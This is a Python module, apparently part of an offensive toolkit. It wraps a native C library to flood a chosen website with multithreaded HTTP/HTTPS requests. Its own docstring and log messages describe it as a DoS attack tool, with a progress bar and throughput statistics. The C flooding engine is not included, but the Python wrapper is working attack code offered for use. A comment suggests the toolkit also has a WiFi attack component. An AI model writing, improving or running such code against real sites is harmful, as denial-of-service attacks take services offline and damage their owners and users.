import os
import ctypes
from tqdm import tqdm
import time
from blessed import Terminal

term = Terminal()

C_FILE_HTTP = None
LIB_FILE_HTTP = None

TERMINAL = None

class TestResult(ctypes.Structure):
    _fields_ = [
        ("total_ok", ctypes.c_int64),
        ("total_err", ctypes.c_int64),
        ("elapsed", ctypes.c_double),
    ]
    
def init(terminal):
    global TERMINAL
    TERMINAL = terminal

def log(msg: str):
    """Safely logs to terminal instance or stdout fallback."""
    if TERMINAL and hasattr(TERMINAL, "_log"):
        TERMINAL._log(msg)
    else:
        print(msg, flush=True)

# C progress callback signature: void callback(int delta)
PROGRESS_CALLBACK = ctypes.CFUNCTYPE(None, ctypes.c_int)

def set_dirs(cfilehttp, libfilehttp):
    global C_FILE_HTTP, LIB_FILE_HTTP

    C_FILE_HTTP, LIB_FILE_HTTP = cfilehttp, libfilehttp

def DOS_HTTP(target_url: str, total_requests: int, num_threads: int = None):
    """Launches a HTTP/HTTPS DoS attack against an website."""
    
    if num_threads is None:
        num_threads = os.cpu_count() or 4

    needs_recompile = False

    if not LIB_FILE_HTTP or not os.path.exists(LIB_FILE_HTTP):
        needs_recompile = True
    elif os.path.exists(C_FILE_HTTP):
        c_mtime = os.path.getmtime(C_FILE_HTTP)
        dll_mtime = os.path.getmtime(LIB_FILE_HTTP)
        if c_mtime > dll_mtime:  # C code is newer than DLL
            log("[*] Detected changes in fast_packet_http.c!")
            needs_recompile = True

    if needs_recompile:
        log("[!!] FATAL ERROR: The C HTTP engine is outdated or not compiled. Run download_dependencies() first.")
        return

    # FIX 2: Load HTTP DLL, not WiFi DLL
    http_lib = ctypes.CDLL(LIB_FILE_HTTP)

    # Bind argument signature & return structure
    http_lib.run_http_stress_test.argtypes = [
        ctypes.c_char_p,     # const char *url
        ctypes.c_int,        # int total_requests
        ctypes.c_int,        # int num_threads
        PROGRESS_CALLBACK,  # ProgressCallback cb
    ]
    http_lib.run_http_stress_test.restype = TestResult

    actual_total = total_requests

    log(f"[*] Targeting:            {target_url}")
    log(f"[*] Native Threads:       {num_threads}")
    log(f"[*] Total Requests:       {actual_total:,}")
    log(f"[*] Engine:               Native C DLL ({LIB_FILE_HTTP})")

    # Setup tqdm progress bar
    pbar = tqdm(total=actual_total, desc="[*] Progress", unit="req", dynamic_ncols=True)

    def update_progress(delta: int):
        pbar.update(delta)

    # Keep strong reference to callback
    c_progress_cb = PROGRESS_CALLBACK(update_progress)

    start_time = time.time()

    # Invoke native C function
    result = http_lib.run_http_stress_test(
        target_url.encode("utf-8"),
        actual_total,
        num_threads,
        c_progress_cb
    )

    pbar.close()

    elapsed = result.elapsed if result.elapsed > 0 else (time.time() - start_time)
    total_ok = result.total_ok
    total_err = result.total_err
    rps = (total_ok + total_err) / elapsed if elapsed > 0 else 0

    log("\n" + "=" * 50)
    log(f"[+] Finished in:          {elapsed:.2f} seconds")
    log(f"[+] Successful (2xx/3xx): {total_ok:,}")
    log(f"[+] Errors / Failures:    {total_err:,}")
    log(f"[+] Throughput:           {rps:,.2f} Req/Sec")
    log("[!] DoS HTTP Attack execution completed.")